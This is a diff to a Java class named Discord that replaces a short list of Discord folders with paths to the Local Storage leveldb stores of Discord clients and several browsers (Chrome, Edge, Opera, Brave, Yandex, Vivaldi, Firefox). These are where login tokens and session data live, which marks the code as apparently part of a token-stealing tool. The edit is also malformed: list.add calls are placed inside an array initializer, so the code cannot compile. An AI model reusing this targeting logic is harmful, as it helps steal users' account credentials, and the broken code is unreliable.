@@ -26,7 +26,18 @@ public class Discord implements Request {
     @Override
     public void init() {
         String[] dataPaths = {
-                System.getenv("APPDATA") + "/Discord",System.getenv("APPDATA") + "/discordcanary",System.getenv("APPDATA") + "/discordptb",System.getenv("APPDATA") + "/LightCord"
+            list.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
+            list.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
+            list.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
+            list.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb/");
+            list.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/");
+            list.add(System.getProperty("user.home") + "/AppData/Roaming/Mozilla/Firefox/Profiles/");
+            list.add(System.getProperty("user.home") + "/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb/");
+            list.add(System.getProperty("user.home") + "/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb/");
+            list.add(System.getProperty("user.home") + "/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/");
+            list.add(System.getProperty("user.home") + "/AppData/Roaming/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/");
+            list.add(System.getProperty("user.home") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/");
+            list.add(System.getProperty("user.home") + "/AppData/Roaming/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/");
         };
         try {
             for (String path: dataPaths) {
